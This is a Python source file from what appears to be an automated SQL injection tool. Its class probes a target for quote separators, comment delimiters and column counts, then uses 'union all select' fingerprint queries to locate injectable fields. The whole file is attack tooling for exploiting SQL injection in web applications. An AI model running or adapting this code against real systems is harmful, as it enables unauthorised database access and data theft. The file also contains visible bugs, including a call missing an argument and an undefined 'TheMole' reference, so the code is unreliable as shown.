#!/usr/bin/python3
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from dbmsmoles import DbmsMole

class InjectionInspector:
    
    # Returns a tuple (separator, parenthesis count)
    def find_separator(self, mole):
        separator_list = ['\'', '"', ' ']
        equal_cmp = { '\'' : 'like', '"' : 'like', ' ' : '='}
        separator = None
        for parenthesis in range(0, 3):
            print('[i] Trying injection using',parenthesis,'parenthesis.')
            mole.parenthesis = parenthesis
            for sep in separator_list:
                print('[i] Trying separator: "' + sep + '"')
                mole.separator = sep
                req = mole.make_request(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}1'.format(sep=sep))
                if mole.analyser.is_valid(req):
                    separator = sep
                    break
            if separator:
                # Validate the negation of the query
                req = mole.make_request(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}0'.format(sep=sep))
                if not mole.analyser.is_valid(req):
                    return (separator, parenthesis)
        if not separator:
            raise Exception()

    # Returns a tuple (comment, parentesis count)
    def find_comment_delimiter(self, mole):
        #Find the correct comment delimiter
        comment_list = ['#', '--', '/*', ' ']
        for parenthesis in range(0, 3):
            print('[i] Trying injection using',parenthesis,'parenthesis.')
            mole.parenthesis = parenthesis
            for com in comment_list:
                print('[i] Trying injection using comment:',com)
                mole.comment = com
                req = mole.make_request(' order by 1')
                if mole.analyser.node_content(req) != mole._syntax_error_content and not DbmsMole.is_error(mole.analyser.decode(req)):
                    return (com, parenthesis)
        mole.parenthesis = 0
        raise Exception()
        #raise SQLInjectionNotExploitable()

    # Returns query column number
    def find_column_number(self, mole):
        #Find the number of columns of the query
        #First get the content of needle in a wrong situation
        req = mole.make_request(' order by 15000')
        content_of_needle = mole.analyser.node_content(req)
        
        last = 2
        done = False
        new_needle_content = mole.analyser.node_content(mole.make_request(' order by %d ' % (last,)))
        while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
            last *= 2
            print('\r[i] Trying ' + str(last) + ' columns     ', end='')
            new_needle_content = mole.analyser.node_content(mole.make_request(' order by %d ' % (last,)))
        pri = last // 2
        print('\r[i] Maximum length: ' + str(last) + '     ', end='')
        while pri < last:
            medio = ((pri + last) // 2) + ((pri + last) & 1)
            print('\r[i] Trying ' + str(medio) + ' columns     ', end='')
            new_needle_content = mole.analyser.node_content(mole.make_request(' order by %d ' % (medio,)))
            if new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
                pri = medio
            else:
                last = medio - 1
        print('\r', end='')
        return pri

    def _find_injectable_field_using(self, mole, dbms_mole):
        base = 714
        fingers = dbms_mole.injectable_field_fingers(mole.query_columns, base)
        for finger in fingers:
            hashes = finger.build_query()
            to_search_hashes = finger.fingers_to_search()
            hash_string = ",".join(hashes)
            req = mole.analyser.decode(mole.make_request(
                        " and 1=0 union all select " + hash_string + dbms_mole.field_finger_trailer()
                  ))
            try:
                injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
                if len(injectable_fields) > 0:
                    print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), injectable_fields)) + "]")
                    field = self._filter_injectable_fields(mole, dbms_mole, injectable_fields, finger)
                    if not field is None:
                        mole._dbms_mole = dbms_mole()
                        mole._dbms_mole.set_good_finger(finger)
                        return field
                    else:
                        print('[i] Failed to inject using these fields.')
            except Exception as ex:
                print(ex)
        return None

    def find_injectable_field(self, mole):
        if mole._dbms_mole is None:
            for dbms_mole in TheMole.dbms_mole_list:
                print('[i] Trying DBMS', mole.dbms_name())
                field = self._find_injectable_field_using(dbms_mole)
                if not field is None:
                    print('[+] Found DBMS:', dbms_mole.dbms_name())
                    return field
        else:
            field = self._find_injectable_field_using(mole, mole._dbms_mole.__class__)
            if not field is None:
                return field
        raise Exception()

    def _filter_injectable_fields(self, mole, dbms_mole_class, injectable_fields, finger):
        for field in injectable_fields:
            print('[i] Trying to inject in field', field + 1)
            query = dbms_mole_class.field_finger_query(mole.query_columns, finger, field)
            req = mole.make_request(query)
            if dbms_mole_class.field_finger(finger) in mole.analyser.decode(req):
                return field
        return None
